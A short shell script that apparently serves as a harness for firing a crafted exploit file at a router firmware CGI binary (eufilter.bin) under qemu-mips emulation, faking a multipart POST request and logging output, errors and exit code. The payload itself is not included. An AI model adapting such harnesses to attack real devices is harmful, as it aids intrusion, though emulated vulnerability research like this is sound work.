#!/bin/sh
L=$(wc -c < /tmp/exploit_flag.bin)
cat /tmp/exploit_flag.bin | REQUEST_METHOD="POST" QUERY_STRING="url=discord.com" CONTENT_TYPE="multipart/form-data; boundary=----x" CONTENT_LENGTH=$L qemu-mips -strace /www/cgi-bin/eufilter.bin > /tmp/flag_out.txt 2> /tmp/flag_err.txt
EC=$?
echo $EC > /tmp/flag_ec.txt
